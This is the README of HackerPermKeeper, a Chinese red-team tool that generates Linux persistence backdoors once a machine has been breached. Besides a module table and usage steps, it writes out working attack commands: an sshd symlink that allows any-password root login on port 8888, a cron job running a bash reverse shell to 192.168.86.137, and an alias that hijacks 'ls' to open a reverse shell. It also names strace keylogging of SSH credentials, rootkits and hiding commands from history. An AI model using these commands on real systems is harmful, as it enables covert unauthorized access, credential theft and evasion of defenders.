# :lock:	HackerPermKeeper  
### 黑客权限保持者
<br/><br/>
  <p align="center">
    <a href="https://www.one-fox.cn/">
      <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F-One--fox-pink" />
    </a>
    <a href="https://taoyuan.cool/">
      <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E5%8D%9A%E5%AE%A2-taoyuan.cool-blue" />
    </a>
    <a href="https://taoyuan.cool/">
      <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-%E5%BC%B1%E9%B8%A1-red" />
    </a>
    <img src="https://img.shields.io/badge/WeChat-vivo50KFCKFC-black">
    <img src="https://badgen.net/github/stars/RuoJi6/HackerPermKeeper/?icon=github&color=black">
    <img src="https://badgen.net/github/issues/RuoJi6/HackerPermKeeper">
    <img src="https://img.shields.io/badge/python%E7%89%88%E6%9C%AC-3_and_2-green">
    <a href="https://flowus.cn/share/3505271f-a987-4fb1-9623-efe58dcc77ec">
     <img src="https://img.shields.io/badge/%E6%96%87%E5%BA%93-wiki-yellow">
    </a>
</p>




通过渗透拿到权限之后，为了不让权限丢失，都会进行权限维持，而在进行权限维持的时候，红队需要花费大量的时候，来验证是否合适，因此在这款工具就诞生 HackerPermKeeper[黑客权限保持者] 
<br/>
查看下面的表格可以知道生成的权限维持文件可以运行的python版本，但是这个项目本身是python3运行的[我自己的环境是Python 3.9.7]



| :lock:权限维持模块           | centos             | Ubuntu             | 推荐指数                                         | 需要权限     | 备注                                                         | py2                | py3                |
| :--------------------------- | ------------------ | ------------------ | ------------------------------------------------ | ------------ | ------------------------------------------------------------ | ------------------ | ------------------ |
| OpenSSH后门万能密码&记录密码 | :x:                | :heavy_check_mark: | :star:                                           | root         | 此后门需要很老的内核版本，而且需要很多依赖环境               | :x:                | :heavy_check_mark: |
| PAM后门                      | :x:                | :x:                | :star:                                           | :x:          | 此后门需要很老的内核版本，而且需要很多依赖环境               | :x:                | :x:                |
| ssh软链接                    | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:                                 | root         | 容易被发现                                                   | :heavy_check_mark: | :heavy_check_mark: |
| ssh公私密钥                  | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:	:star:   | User         | 发现程度很难，参考了挖矿病毒                                 | :heavy_check_mark: | :heavy_check_mark: |
| 后门帐号                     | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:                       | root         | 用命令添加账户，不会创建用户home目录[有一个是直接指向root目录] | :heavy_check_mark: | :heavy_check_mark: |
| crontab计划任务              | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:             | User or root | 难以发现，通过执行计划任务                                   | :heavy_check_mark: | :heavy_check_mark: |
| Strace后门                   | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:                                 | root         | 键盘记录的后门                                               | :heavy_check_mark: | :heavy_check_mark: |
| Alias后门                    | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:             | root         | 别名后门，难以发现，但是需要用户去执行命令                   | :heavy_check_mark: | :heavy_check_mark: |
| Rootkit后门[检测]            | :x:                | :x:                | :star:	:star:	:star:                       | root         | 难以发现，但是安装复杂，而且指定内核版本                     | :x:                | :x:                |
| 空格不记录命令               | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star::star::star::star:     | root         | 有的服务器设置了空格记录执行命令，执行这个脚本快速设置不记录空格命令 | :heavy_check_mark: | :heavy_check_mark: |
| ssh软链接&crontab              | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:             | root | 快速生成软链接[需要运行脚本成功后，一分钟连接]，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行 | :heavy_check_mark: | :heavy_check_mark: |
| check.py                     | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star::star::star: | User         | 快速检测目标机器可以使用那个权限维持模块                     | :heavy_check_mark: | :heavy_check_mark: |

<br/>

##  :closed_lock_with_key:权限的划分

| UID    | 数值                                                        | 比如：       |
| ------ | ----------------------------------------------------------- | ------------ |
| 0      | 超级管理员（root用户）                                      | root         |
| 1～999 | Linux系统将一些服务程序和系统任务分配给独立的系统用户来运行 | bin          |
| 1000   | 普通用户UID从1000开始                                       | www-data,www |

<br/>

## :rocket:快速使用
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/f06c65b6-b845-4e0e-ac5b-25e08040c8e4)


```
python3运行此项目[我自己的环境是Python 3.9.7]，但是运行权限维持模块脚本请看上面的表格
安装依赖
pip install -r requirements.txt
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/9a679287-969d-4e44-ba6a-9d71a2ff512c)


```
快速判断目标机器适合的权限维持模块，运行 /check/ 目录下的check.py文件[这个不需要任何依赖环境，python3和python2都支持]
python check.py
python3 check.py
python2 check.py
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/a497be9c-266c-4be2-9b9f-df99a7d589f7)



```
查看权限维持模块信息
python main.py -c 1
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/280b5123-d626-4b79-bcdc-1001e3bf763e)

```
查看权限维持模详细块信息
python main.py -c 2
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/60183ad4-8b48-4562-9985-5fa15e4f54c2)


```
使用此项目生成权限维持脚本[在这之前，请先运行check.py脚本判断出目标机器适合什么类型权限维持的脚本]
python main.py -m 1   #选择模块
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/ca06dcc9-17d8-4132-82c1-f2635628d1e9)

```
有的生成的脚本文件。需要在生成之后进行手动修改
比如：修改反弹shellip以及端口，后门用户密码，ssh密钥密码，ssh密钥等[此缺陷将会在第二个版本修复]
生成的文件会在payloads目录下产生
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/1b4743a5-e55b-444c-883a-68f919eb9753)


使用视频：https://www.bilibili.com/video/BV1fV411N7Qc/


## :triangular_flag_on_post:	常见后门介绍
```
OpenSSH后门万能密码&记录密码（这个需要依赖环境），就是把对方的门换个锁，但是原来的钥匙也可以使用
发现程度：||

PAM后门，PAM是一个Linux登录验证的认证服务，修改其中关于ssh登录的验证，添加一个万能密码，已经记录的账号密码位置（类似把对方房间内有内鬼）
发现程度：||


SSH软链接
cat /etc/ssh/sshd_config|grep UsePAM
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
ssh root@xx.xx.xx.xx -p 8888 任意密码登录即可
发现程度：||||||


公私钥
使用密钥进行登录
发现程度：||||||


后门帐号
使用命令添加账号
发现程度：||||||


crontab后计划任务
1、编辑后门反弹
vim /etc/.111.sh

#!/bin/bash
sh -i >& /dev/tcp/192.168.86.137/3434 0>&1

chmod +x /etc/.111.sh

2、添加定时任务
vim /etc/crontab
*/1 * * * * root /etc/.1111.sh
发现程度：||||||


Strace后门
strace是一个动态跟踪工具，它可以跟踪系统调用的执行。
我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围
可以记录ssh明文和密钥（登录的）和Rootkit配合一起
发现程度：||||

命令自定义-Alias后门
alias命令的功能：为命令设置别名
alias ls='alerts(){ ls $* --color=auto;bash -i >& /dev/tcp/192.168.86.137/3333 0>&1; };alerts'
执行ls就会反弹shell
持久化+隐藏：重启依旧生效
发现程度：||||

Rootkit后门
https://github.com/f0rb1dd3n/Reptile/releases/
Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。
发现程度：||
但是使用工具进行检测出来情况很大，建议看代码，手动编写此工具（难度很大）


history不记录执行命令
在输入命令时候，添加空格

ssh软链接&crontab
快速生成软链接[需要运行脚本成功后，一分钟连接]，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行

|||||  越多，越容易发发现
||        越少，越难发现，但是部署起来，需要的依赖很多

```

## :warning:错误error
```
1、
使用ssh密钥后门连接的时候，出现这个错误，就是当前ip有在known_hosts中存在多个主机文件
解决：ssh-keygen -f "known_hosts文件" -R "目标Ip"
或者使用另外一台机器连接
```
![TON3EA2_MQW`94HRK53GZTQ](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/93dad03b-af7c-4e62-9dc8-87722504ce10)
删除成功
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/3342097e-b280-4b68-b90b-788a2de5cca6)

```
2、
下载的ssh密钥连接的时候出现安全性错误
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/76dfafe5-22a7-4698-b08e-fd5857a15641)
解决：修改权限 chmod 600 密钥文件，然后在连接
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/8d9262ac-1555-466d-8ed7-197fb9521d43)


<br/><br/>
## :zap:提交问题
有问题请提交issues<br/>
<a href="https://github.com/RuoJi6/HackerPermKeeper/issues"><img src="https://badgen.net/github/issues/RuoJi6/HackerPermKeeper"></a>
<br/>
加我微信进开发者微信群聊 
<br/><img src="https://img.shields.io/badge/WeChat-vivo50KFCKFC-green">
<br/><br/>

## :world_map:版本更新
```
1.0 权限维持
----------------------------------------------------------------------------------------------------------
2.0 1、利用成功之后删除文件
    2、命令配合使用[软链接+计划任务]
    3、判断当前系统有没有python环境
    4、使用ssh密钥的时候，在对方服务器生成的时候，生成完成之后，删除文件id_ed25519.pub和id_ed25519
    5、设置全局环境变量不记录空格命令[history]
    6、修改在不同环境下，main.py运行bug
    7、修复计划任务，在反弹shell的时候，出现的python版本问题
    8、ssh密钥权限维持模块，bug修复，如果是出现不是root，权限也可以成功
    9、修复check.py脚本检测普通用户权限
----------------------------------------------------------------------------------------------------------
3.0 1、php web权限维持马[首页马，加密马内存马，不死马]
    2、模块配合使用[添加用户加计划任务，ssh密钥加计划任务]
    3、在计划任务配合使用的时候，发现还需要判断文件有没有加锁
```

## :beginner:开发日志
<a href="https://flowus.cn/share/3505271f-a987-4fb1-9623-efe58dcc77ec">点击跳转wiki</a>


## :star2:Stargazers over time [![Stargazers over time](https://starchart.cc/RuoJi6/HackerPermKeeper.svg)](https://starchart.cc/RuoJi6/HackerPermKeeper)




<a href="https://github.com/RuoJi6">
  <img height=150 align="center" src="https://github-readme-stats.vercel.app/api?username=RuoJi6"/>
</a>
<a href="https://github.com/RuoJi6/HackerPermKeeper/">
  <img height=150 align="center" src="https://github-readme-stats.vercel.app/api/top-langs?username=RuoJi6&layout=compact&langs_count=8&card_width=320" />
</a>

